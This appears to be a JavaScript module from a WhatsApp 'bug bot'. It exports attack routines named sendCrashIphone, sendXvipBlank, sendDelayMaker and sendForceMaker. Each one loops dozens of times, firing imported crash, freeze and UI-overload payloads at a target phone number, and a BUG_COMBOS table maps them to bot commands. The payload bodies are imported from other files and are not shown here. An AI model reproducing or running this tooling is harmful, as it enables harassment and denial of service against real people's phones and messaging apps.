import { sleep, parsePhoneTarget } from "./helpers.js";
import { DelayV1, DelayV2, DelayV3, DelayV4, DelayV5, DelayHard } from "./delay.js";
import { BUG_DELAY_MS, makeProgressLogger } from "./progress.js";
import { lahora, iosCtt, fiOSNew, UiOverload } from "./ios.js";

export function requirePhoneTarget(raw) {
  const target = parsePhoneTarget(raw);
  if (!target) throw new Error("Syntax Error. Contoh: 628xxx (tanpa awalan 0)");
  return target;
}

export async function sendDelayMaker(sock, target, { loops = 35, delayMs = BUG_DELAY_MS, logger = null } = {}) {
  const startedAt = Date.now();
  const onProgress = makeProgressLogger(logger, "delaymaker", loops);
  for (let i = 0; i < loops; i++) {
    await DelayHard(sock, target);
    await sleep(delayMs);
    await DelayHard(sock, target);
    await sleep(delayMs);
    onProgress(i + 1);
  }
  return { success: loops, failed: 0, ms: Date.now() - startedAt };
}

export async function sendXvipBlank(sock, target, { loops = 35, delayMs = BUG_DELAY_MS, logger = null } = {}) {
  const startedAt = Date.now();
  const onProgress = makeProgressLogger(logger, "xvipblank", loops);
  for (let i = 0; i < loops; i++) {
    await lahora(sock, target);
    await sleep(delayMs);
    await UiOverload(sock, target);
    await sleep(delayMs);
    await DelayHard(sock, target);
    await sleep(delayMs);
    onProgress(i + 1);
  }
  return { success: loops, failed: 0, ms: Date.now() - startedAt };
}

export async function sendCrashIphone(sock, target, { loops = 35, delayMs = BUG_DELAY_MS, logger = null } = {}) {
  const startedAt = Date.now();
  const onProgress = makeProgressLogger(logger, "crashiphone", loops);
  for (let i = 0; i < loops; i++) {
    await fiOSNew(sock, target);
    await sleep(delayMs);
    await iosCtt(sock, target);
    await sleep(delayMs);
    onProgress(i + 1);
  }
  return { success: loops, failed: 0, ms: Date.now() - startedAt };
}

export async function sendForceMaker(sock, target, { loops = 35, delayMs = BUG_DELAY_MS, logger = null } = {}) {
  const startedAt = Date.now();
  const onProgress = makeProgressLogger(logger, "forcemaker", loops);
  for (let i = 0; i < loops; i++) {
    await DelayV1(sock, target);
    await sleep(delayMs);
    await DelayV2(sock, target);
    await sleep(delayMs);
    await DelayV3(sock, target);
    await sleep(delayMs);
    await DelayV4(sock, target);
    await sleep(delayMs);
    await DelayV5(sock, target);
    await sleep(delayMs);
    onProgress(i + 1);
  }
  return { success: loops, failed: 0, ms: Date.now() - startedAt };
}

export const sendC1 = sendDelayMaker;

export const BUG_COMBOS = {
  delaymaker: sendDelayMaker,
  xvipblank: sendXvipBlank,
  crashiphone: sendCrashIphone,
  forcemaker: sendForceMaker,
  c1: sendC1,
};
